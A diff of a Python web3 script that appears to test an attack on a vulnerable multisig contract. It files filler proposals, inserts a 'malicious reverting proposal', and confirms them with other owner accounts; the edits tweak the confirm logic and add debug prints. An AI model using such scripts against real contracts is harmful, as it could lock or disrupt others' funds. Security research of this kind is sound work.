@@ -173,23 +173,11 @@ def batch_propose_and_get_pids(contract, proposer_acct, tos, vals, datas, nonce_
     return pids, txh, rec
 
 def batch_confirm(contract, confirmer_acct, pids_list, nonce_manager):
-    if not pids_list:
-        return None, None
-    if has_batch_fn(contract, "batchConfirm"):
         fn = contract.functions.batchConfirm(pids_list)
-        tx = fn.build_transaction({"from": confirmer_acct.address, "nonce": nonce_manager.next(), "gas": 1_500_000, "gasPrice": GAS_PRICE, "chainId": chain_id})
+        tx = fn.build_transaction({"from": confirmer_acct.address, "chainId": chain_id})
         txh, rec = sign_send(w3, confirmer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
         dump_tx_artifact("batch_confirm_tx", txh, rec)
         return txh, rec
-    else:
-        last_rec = None
-        for i, pid in enumerate(pids_list):
-            fn = contract.functions.confirmTransaction(pid)
-            tx = fn.build_transaction({"from": confirmer_acct.address, "chainId": chain_id})
-            txh, rec = sign_send(w3, confirmer_acct, tx, nonce_manager=nonce_manager, wait_receipt=True)
-            dump_tx_artifact(f"confirm_fallback_{i}", txh, rec)
-            last_rec = rec
-        return txh, last_rec
 
 def batch_execute(contract, executor_acct, pids_list, nonce_manager):
     if not pids_list:
@@ -1076,6 +1064,7 @@ if has_batch_fn(vuln, "batchPropose"):
         try:
             pc = vuln.functions.proposalCount().call()
             batch_info.append(pc - 1)
+            print(batch_info)
         except Exception:
             pass
 else:
@@ -1102,7 +1091,7 @@ else:
             pid = 0
         batch_info.append(pid)
 print(f'   {len(batch_info)} filler proposals proposed (VMS).')
-
+print(batch_info)
 # --- 3) Propose the malicious reverting transaction (The Attack - VMS) ---
 print(' Inserting malicious reverting proposal.')
 mal_pid, reverter_addr = deploy_reverting_target_and_propose(vuln, owner_accounts[0], Decimal(0), owners) 
@@ -1164,8 +1153,8 @@ else:
 
 # --- 5) Confirm the proposal with the other owners so it becomes executable ---
 print(' Confirming ALL 35 proposals (VMS)')
-confirmer1 = owner_accounts[1]
-confirmer2 = owner_accounts[2]
+confirmer1 = get_owner_account(1)
+confirmer2 = get_owner_account(2)
 nonce_manager_1 = NonceManager(w3, confirmer1.address)
 nonce_manager_2 = NonceManager(w3, confirmer2.address)
 
